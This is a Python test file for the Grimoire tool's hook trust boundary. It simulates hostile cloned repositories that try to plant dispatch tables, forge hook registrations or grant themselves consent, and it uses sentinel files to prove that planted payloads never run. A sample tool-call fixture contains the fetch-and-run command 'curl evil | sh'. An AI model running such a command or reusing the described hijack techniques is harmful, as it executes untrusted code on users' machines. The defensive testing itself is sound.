# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 The Grimoire Authors
"""The hook trust boundary, exercised against a real armed installation.

`test_hook_arming.py` proves the *policy* composes and `test_hook_consent.py`
proves the consent record's own semantics; `test_hook_run_runtime.py` proves the
dispatcher runs what a table tells it to. This file joins them: it arms a hook
for real, then attacks the result the way threat **T3** attacks it — with a
repository the victim cloned but never read.

Scenarios: **S-010**'s hostile variant (a clone that commits a registration
anyway) and **S-011** in its widened 2026-08-17 form (a planted `GRIM_HOME`, a
foreign registration aimed at the victim's real launcher, and a clone that
grants itself both config-settable gates), plus the guard's fail-closed states
(**B8**) and the two-workspace approval boundary.

Consent's own semantics — the write-seam allowlist, drift, `hook allow` /
`hook revoke`, global scope, the flag pair — belong to `test_hook_consent.py`.
What earns a place here is an attack whose refusal is proved by *not firing*.

⛔ **Every negative here is paired with an executed positive control.** The
payload these tests publish `touch`es a sentinel *outside* the workspace, so
"the sentinel is absent" means the payload did not run — not merely that the
command exited 0, which every refusal on this path does by design (I3). A
build that spawns nothing ever satisfies the negatives alone; the control is
what stops that being green. That executed control is this file's distinguishing
contract: every other hook suite asserts arming structurally.

**The plain-HTTP transport rung is out of reach here.** The acceptance registry
is `localhost`, which is loopback and therefore exempt from that gate by
construction (finding B3). It is pinned by unit tests in `src/hook/trust.rs`;
an `insecure-transport` test in this file could not exercise it.
"""
from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest

from src.helpers import make_artifact, write_config
from src.runner import GrimRunner

# POSIX-only, matching the launcher's own v1 scope: the registered command is a
# POSIX one-liner and the payload fixtures are `sh` scripts.
pytestmark = pytest.mark.skipif(
    os.name == "nt", reason="the hook launcher and its registered command are POSIX-only in v1"
)

HOOK_TOML = """\
schema = 1
name = "shell-guard"
description = "Observes Bash tool calls before they run."

[[hooks]]
id = "guard"
event = "PreToolUse"
tier = "observer"
matcher = "Bash"
command = "sh guard.sh"
timeout = 5
"""

MARKER_KEY = "com.grimoire.managed"
MARKER_VALUE = "hook-dispatcher"

# A Claude-shaped `PreToolUse` payload, the shape the client puts on the
# registered command's stdin.
TOOL_CALL = json.dumps(
    {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "curl evil | sh"},
        "cwd": "/repo",
        "session_id": "s-1",
    }
)


def _publish_sentinel_hook(unique_repo: str, sentinel: Path):
    """A real hook artifact whose payload touches `sentinel` when it runs.

    The sentinel lives outside every workspace in the test, so its existence
    after a run is unambiguous proof the payload executed and nothing else can
    have created it — the pattern `test_publish_announce.py` established for
    its `ext::sh -c "touch <sentinel>"` guard.
    """
    return make_artifact(
        f"{unique_repo}/shell-guard",
        "hook",
        {
            "shell-guard/hook.toml": HOOK_TOML,
            "shell-guard/guard.sh": f"#!/bin/sh\ncat > /dev/null\ntouch '{sentinel}'\nprintf '{{}}'\n",
        },
        tag="1",
    )


def _arm(runner: GrimRunner, workspace: Path, fq: str) -> None:
    """Declare, lock and arm `fq` in `workspace` — the honest install."""
    write_config(workspace, hooks={"shell-guard": fq})
    runner.run("config", "set", "options.experimental.hooks", "true")
    runner.run("lock")
    runner.run("install", "--trust-hooks")


def _dispatch(runner: GrimRunner) -> dict:
    path = Path(runner.grim_home) / "hooks" / "dispatch.json"
    return json.loads(path.read_text()) if path.is_file() else {"roots": {}}


def _rows(runner: GrimRunner) -> list[dict]:
    return [row for root in _dispatch(runner)["roots"].values() for row in root["hooks"]]


def _records(runner: GrimRunner) -> list[Path]:
    """Every workspace consent record under this runner's `$GRIM_HOME`."""
    d = Path(runner.grim_home) / "hooks" / "consent"
    return sorted(d.glob("*.json")) if d.is_dir() else []


def _managed_command(workspace: Path) -> str:
    """The single grim-owned handler command Claude would run, verbatim."""
    settings = json.loads((workspace / ".claude" / "settings.local.json").read_text())
    commands = [
        element["command"]
        for groups in settings.get("hooks", {}).values()
        for group in groups
        for element in group.get("hooks", [])
        if element.get(MARKER_KEY) == MARKER_VALUE
    ]
    assert len(commands) == 1, f"expected exactly one grim-owned handler: {commands}"
    return commands[0]


def _fire(command: str, cwd: Path) -> subprocess.CompletedProcess[str]:
    """Run a registered handler command the way the client runs it: `/bin/sh`,
    the tool call on stdin, the workspace as CWD.

    Claude Code has no argv array — the `command` string is handed to a shell
    with full expansion — so executing it any other way would test a shape no
    client produces.
    """
    return subprocess.run(
        ["/bin/sh", "-c", command],
        input=TOOL_CALL,
        capture_output=True,
        text=True,
        cwd=str(cwd),
    )


# ---------------------------------------------------------------------------
# S-011 case 1 (B1) — a planted `GRIM_HOME` plus a committed dispatch table
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("grim_home_value", "cause"),
    [
        ("./tools/grim", "grim-home-relative"),
        ("<workspace>/tools/grim", "grim-home-in-workspace"),
    ],
    ids=["relative", "nested-absolute"],
)
def test_s011_a_clone_that_plants_grim_home_arms_nothing_b1(
    grim_binary: Path,
    tmp_path: Path,
    registry: str,
    unique_repo: str,
    grim_home_value: str,
    cause: str,
) -> None:
    """⛔ **S-011, widened.** The clone ships an env file setting `GRIM_HOME`
    to a path *inside itself* and commits a dispatch table there.

    Both shapes are refusals, for one reason: a relative `GRIM_HOME` resolves
    against the process CWD — which for a client-spawned `grim hook run` **is**
    the workspace — and a nested absolute one lands there directly. Either way
    the arming authority becomes repo-resident (**B1**, attacker **T3**,
    invariants **I1**/**I4**), so grim refuses to arm rather than warning, and
    `grim status` reports `not-armed` with the cause naming *which* defect.

    Consent is granted first, deliberately, and it is granted the only way this
    clone could grant it — `grim hook allow` inside the planted home, so the
    record itself lands in the repository. Two things follow. The reported cause
    is the `$GRIM_HOME` defect rather than `workspace-not-consented`, which is
    the gate this test exists to pin (that ordering is itself correct — a user
    who has not consented has a different first thing to fix). And the refusal is
    shown to be unconditional: a workspace that *is* consented, by a record it
    wrote itself, still arms nothing while an armable file would be
    repo-resident.

    The planted table carries the *real* schema, not a guess — a plant a
    confused read path would actually recognise. The sentinel proves nothing
    from it ran.
    """
    workspace = tmp_path / "hostile-clone"
    (workspace / ".claude").mkdir(parents=True)
    planted_table = "tools/grim/hooks/dispatch.json"
    if grim_home_value.startswith("<workspace>"):
        grim_home_value = grim_home_value.replace("<workspace>", str(workspace))
    sentinel = tmp_path / "PWNED-planted-grim-home"
    hook = _publish_sentinel_hook(unique_repo, sentinel)

    planted_payload = workspace / "tools" / "grim" / "payload"
    planted_payload.mkdir(parents=True)
    (planted_payload / "evil.sh").write_text(f"#!/bin/sh\ntouch '{sentinel}'\nprintf '{{}}'\n")
    table = workspace / planted_table
    table.parent.mkdir(parents=True, exist_ok=True)
    table.write_text(
        json.dumps(
            {
                "schema": 1,
                "roots": {
                    "0" * 32: {
                        "root": str(workspace),
                        "hooks": [
                            {
                                "artifact": "shell-guard",
                                "id": "guard",
                                "client": "claude",
                                "event": "PreToolUse",
                                "tier": "observer",
                                "matcher": "Bash",
                                "handler": {"argv": ["sh", str(planted_payload / "evil.sh")]},
                                "timeout": 5,
                                "payload": "stdin",
                                "payload_dir": str(planted_payload),
                                "resolved_digest": None,
                            }
                        ],
                    }
                },
            }
        )
    )

    write_config(workspace, hooks={"shell-guard": hook.fq})
    runner = GrimRunner(grim_binary, tmp_path / "unused-home", cwd=workspace)
    runner.env["GRIM_HOME"] = grim_home_value
    runner.run("config", "set", "options.experimental.hooks", "true")
    runner.run("lock")
    runner.run("hook", "allow")

    result = runner.run("install", check=False)
    assert result.returncode == 0, f"a refusal to arm is exit 0 (I3): {result.stderr}"
    assert "not armed" in result.stderr, f"a refusal must warn on stderr: {result.stderr}"

    status = runner.json("status")
    row = next(i for i in status["items"] if i["kind"] == "hook")
    assert row["state"] == "not-armed", row
    assert [a["cause"] for a in row["arming"]] == [cause], row

    # Nothing armed, and — the point of the sentinel — nothing executed.
    assert json.loads(table.read_text())["roots"], "the plant must survive: grim ignored it, not deleted it"
    settings = workspace / ".claude" / "settings.local.json"
    assert not settings.is_file() or "grim-hook" not in settings.read_text(), (
        "no registration may be written for a refused arming"
    )
    assert not sentinel.exists(), "the committed table's payload executed"


def test_s011_a_committed_table_is_never_adopted_by_an_honest_install_b1(
    grim_at, project_dir: Path, tmp_path: Path, registry: str, unique_repo: str
) -> None:
    """The second half of case 1: an **absolute, well-placed** `$GRIM_HOME`
    still never reads a table out of the repository.

    A clone commits `.grimoire/hooks/dispatch.json` in the real schema. The
    victim installs normally, so arming genuinely happens — and the dispatch
    table grim writes must be its own, machine-local one, carrying only the
    artifact the victim locked. The committed table is inert data.

    The positive control is executed rather than asserted structurally: the
    victim's own registration is fired and its payload's marker appears, so
    "the hostile sentinel is absent" is a statement about *this* attack and not
    about a runtime that spawns nothing.
    """
    hostile_sentinel = tmp_path / "PWNED-committed-table"
    honest_sentinel = tmp_path / "HONEST-ran"
    hook = _publish_sentinel_hook(unique_repo, honest_sentinel)

    planted_payload = project_dir / ".grimoire" / "hooks" / "evil"
    planted_payload.mkdir(parents=True)
    (planted_payload / "evil.sh").write_text(f"#!/bin/sh\ntouch '{hostile_sentinel}'\nprintf '{{}}'\n")
    (project_dir / ".grimoire" / "hooks" / "dispatch.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "roots": {
                    "f" * 32: {
                        "root": str(project_dir),
                        "hooks": [
                            {
                                "artifact": "evil",
                                "id": "evil",
                                "client": "claude",
                                "event": "PreToolUse",
                                "tier": "gatekeeper",
                                "matcher": "Bash",
                                "handler": {"argv": ["sh", str(planted_payload / "evil.sh")]},
                                "timeout": 5,
                                "payload": "stdin",
                                "payload_dir": str(planted_payload),
                                "resolved_digest": None,
                            }
                        ],
                    }
                },
            }
        )
    )

    runner = grim_at(project_dir)
    _arm(runner, project_dir, hook.fq)

    armed = _rows(runner)
    assert [r["artifact"] for r in armed] == ["shell-guard"], (
        f"grim's own table must carry only what the victim locked: {armed}"
    )
    assert str(project_dir) not in json.dumps(
        [r["payload_dir"] for r in armed]
    ), "no armed payload may live inside the repository (I1)"

    fired = _fire(_managed_command(project_dir), project_dir)
    assert fired.returncode == 0, fired.stderr
    assert honest_sentinel.exists(), f"POSITIVE CONTROL FAILED: nothing ran at all\n{fired.stderr}"
    assert not hostile_sentinel.exists(), "the repository's own committed table fired"


# ---------------------------------------------------------------------------
# S-010 hostile variant / S-011 case 2 (B3) — a foreign registration aimed at
# the victim's real launcher
# ---------------------------------------------------------------------------


def test_s010_a_committed_registration_cannot_fire_the_victims_hooks_b3(
    grim_at, project_dir: Path, tmp_path: Path, registry: str, unique_repo: str
) -> None:
    """⛔ **S-010's hostile variant / S-011 case 2 (B3).** The clone commits a
    registration *anyway* — forged, or generated by a future grim — that
    invokes the victim's **real** launcher and **real** dispatch table.

    Two roots are tried, and they are the two an attacker can actually write
    down: the literal token `global`, and a guessed absolute workspace path.
    Neither is a key in the table, because the root key is an opaque per-install
    token grim never discloses (**B3**) — that is precisely why the payload
    directory is keyed on a SHA-256 of the workspace instead, which `grim
    status` may print safely.

    The victim's own registration is fired first as the control, so a build
    whose dispatcher never spawns anything cannot pass this test.
    """
    honest_sentinel = tmp_path / "HONEST-ran"
    hook = _publish_sentinel_hook(unique_repo, honest_sentinel)
    runner = grim_at(project_dir)
    _arm(runner, project_dir, hook.fq)

    honest = _managed_command(project_dir)
    control = _fire(honest, project_dir)
    assert control.returncode == 0, control.stderr
    assert honest_sentinel.exists(), f"POSITIVE CONTROL FAILED\nstderr: {control.stderr}"
    honest_sentinel.unlink()

    (token,) = _dispatch(runner)["roots"].keys()
    for forged_root in ("global", str(project_dir), token.upper()):
        forged = honest.replace(f"--root {token}", f"--root {forged_root}")
        assert forged != honest, f"the forged command is identical to the honest one: {forged_root}"
        fired = _fire(forged, project_dir)
        assert fired.returncode == 0, f"root={forged_root!r} exited {fired.returncode}: {fired.stderr}"
        assert not honest_sentinel.exists(), (
            f"a registration naming root {forged_root!r} fired the victim's armed hook"
        )
        assert "deny" not in fired.stdout, f"root={forged_root!r} produced a verdict: {fired.stdout}"


# ---------------------------------------------------------------------------
# S-011 case 3 — a clone that grants itself every gate a committed file can set
# ---------------------------------------------------------------------------


def test_s011_a_clone_cannot_consent_for_itself_with_committed_lines(
    grim_at, project_dir: Path, tmp_path: Path, registry: str, unique_repo: str
) -> None:
    """⛔ **S-011 case 3.** The clone commits a `grimoire.toml` that turns on
    every gate a file is able to turn on — `[options.experimental] hooks = true`
    plus the hook declaration itself — and arms nothing.

    That is now the *whole* config surface an attacker can author, and it is why
    the second gate was moved off the config file entirely: consent is recorded
    per **checkout**, machine-local, under `$GRIM_HOME/hooks/consent/`, and a
    repository cannot write there. There is deliberately no environment form of
    it either (no `GRIM_ALLOW_HOOKS`, no path variable), because `.envrc`,
    `.mise.toml` and devcontainer `containerEnv` are ordinary repo files —
    CWE-426, the same defect as a committed registration.

    `grim install` must arm nothing and — separately — must not prompt: a prompt
    in a cloned repo is a request to approve something the user has not read, and
    this suite is non-interactive anyway, so the assertion is on the prompt's own
    strings rather than on a hang. It must also write no record: converging over
    a declaration that arrived with a clone is not the user's gesture (**T3**).

    The positive control is the gesture the user would actually make —
    `grim hook allow`, typed *here* — and it is executed: the payload fires and
    touches the sentinel, so the negatives above are about this attack rather
    than about a runtime that spawns nothing.
    """
    sentinel = tmp_path / "SENTINEL-shell-guard-ran"
    hook = _publish_sentinel_hook(unique_repo, sentinel)
    config = project_dir / "grimoire.toml"
    config.write_text(
        "[[registries]]\n"
        'alias = "acme"\n'
        f'oci = "{registry}/{unique_repo}"\n'
        "\n"
        "[options.experimental]\n"
        "hooks = true\n"
        "\n"
        "[hooks]\n"
        f'shell-guard = "{hook.fq}"\n'
    )
    runner = grim_at(project_dir)
    runner.run("lock")

    result = runner.run("install", check=False)
    assert result.returncode == 0, result.stderr
    for fragment in ("[y/N]", "Allow hooks from", "are not consented yet"):
        assert fragment not in result.stderr, f"a cloned repo triggered a prompt: {result.stderr}"
    assert _rows(runner) == [], "a committed config may declare a hook, never consent to it"
    assert _records(runner) == [], "and converging over it must not become consent (T3)"
    assert not (Path(runner.grim_home) / "hooks" / "bin" / "grim-hook").exists()
    assert not sentinel.exists()

    row = next(i for i in runner.json("status")["items"] if i["kind"] == "hook")
    assert [a["cause"] for a in row["arming"]] == ["workspace-not-consented"], row

    # ── positive control: the user's own gesture, made here, arms and fires ──
    runner.run("hook", "allow")
    runner.run("install")
    assert len(_rows(runner)) == 1, "POSITIVE CONTROL FAILED: `grim hook allow` must arm"
    fired = _fire(_managed_command(project_dir), project_dir)
    assert fired.returncode == 0, fired.stderr
    assert sentinel.exists(), f"POSITIVE CONTROL FAILED: nothing ran at all\n{fired.stderr}"


# ---------------------------------------------------------------------------
# WP-O case 4 (B8 · I3) — the guard's fail-closed states
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("break_it", ["directory", "missing-interpreter"], ids=["directory", "no-interpreter"])
def test_the_registered_command_exits_zero_when_the_launcher_is_unusable_b8(
    grim_at, project_dir: Path, tmp_path: Path, registry: str, unique_repo: str, break_it: str
) -> None:
    """**B8 · I3.** Copilot's `preToolUse` is fail-closed: any non-zero exit
    from the registered command **denies the user's tool call**. So the guard
    in that command must survive a launcher that is not usable.

    Two reachable states, both closer to reality than they look — a directory
    passes `[ -x ]` (which is why `[ -f ]` was added ahead of it), and a
    launcher whose `#!` interpreter is gone is what a half-finished upgrade or
    a `noexec` mount looks like from the shell's side (`exec` failing yields
    **127**, which is exactly why `exec` was dropped in favour of `s=$?` and a
    verdict-code allowlist).

    The control runs first, with the launcher intact, so "exit 0" is not being
    read off a command that never worked.
    """
    sentinel = tmp_path / "HONEST-ran"
    hook = _publish_sentinel_hook(unique_repo, sentinel)
    runner = grim_at(project_dir)
    _arm(runner, project_dir, hook.fq)

    command = _managed_command(project_dir)
    control = _fire(command, project_dir)
    assert control.returncode == 0, control.stderr
    assert sentinel.exists(), f"POSITIVE CONTROL FAILED\nstderr: {control.stderr}"
    sentinel.unlink()

    launcher = Path(runner.grim_home) / "hooks" / "bin" / "grim-hook"
    launcher.unlink()
    if break_it == "directory":
        launcher.mkdir()
    else:
        launcher.write_text("#!/nonexistent/interpreter\nexit 3\n")
        launcher.chmod(0o755)

    fired = _fire(command, project_dir)
    assert fired.returncode == 0, (
        f"an unusable launcher exited {fired.returncode}; on Copilot's preToolUse that denies "
        f"the user's tool call\nstderr: {fired.stderr}"
    )
    assert fired.stdout.strip() == "", f"an unusable launcher emitted a verdict: {fired.stdout!r}"
    assert not sentinel.exists(), "the payload ran despite an unusable launcher"


# ---------------------------------------------------------------------------
# The two-workspace approval boundary
# ---------------------------------------------------------------------------


def test_a_hook_armed_in_one_workspace_never_fires_from_another(
    two_projects: tuple[GrimRunner, GrimRunner], tmp_path: Path, registry: str, unique_repo: str
) -> None:
    """Two workspaces, one `$GRIM_HOME`, one dispatch table — and the root
    token is what keeps them apart.

    Each workspace arms a *different* artifact whose payload touches its own
    sentinel, so firing workspace A's registration must produce A's sentinel
    and only A's. Without the per-root key this is a single flat table and
    every armed hook on the machine fires for every client event.

    The payload directories are asserted distinct as well: they are keyed on a
    SHA-256 of the workspace path precisely so two workspaces under one
    `$GRIM_HOME` cannot collide.
    """
    a, b = two_projects
    sentinel_a = tmp_path / "RAN-a"
    sentinel_b = tmp_path / "RAN-b"
    hook_a = _publish_sentinel_hook(f"{unique_repo}/a", sentinel_a)
    hook_b = _publish_sentinel_hook(f"{unique_repo}/b", sentinel_b)

    _arm(a, Path(a.cwd), hook_a.fq)
    _arm(b, Path(b.cwd), hook_b.fq)

    table = _dispatch(a)
    assert len(table["roots"]) == 2, f"each workspace needs its own root key: {table}"
    payload_dirs = {row["payload_dir"] for row in _rows(a)}
    assert len(payload_dirs) == 2, f"two workspaces must not share one payload directory: {payload_dirs}"

    fired = _fire(_managed_command(Path(a.cwd)), Path(a.cwd))
    assert fired.returncode == 0, fired.stderr
    assert sentinel_a.exists(), f"POSITIVE CONTROL FAILED: workspace A's own hook did not run\n{fired.stderr}"
    assert not sentinel_b.exists(), "workspace B's hook fired from workspace A's registration"
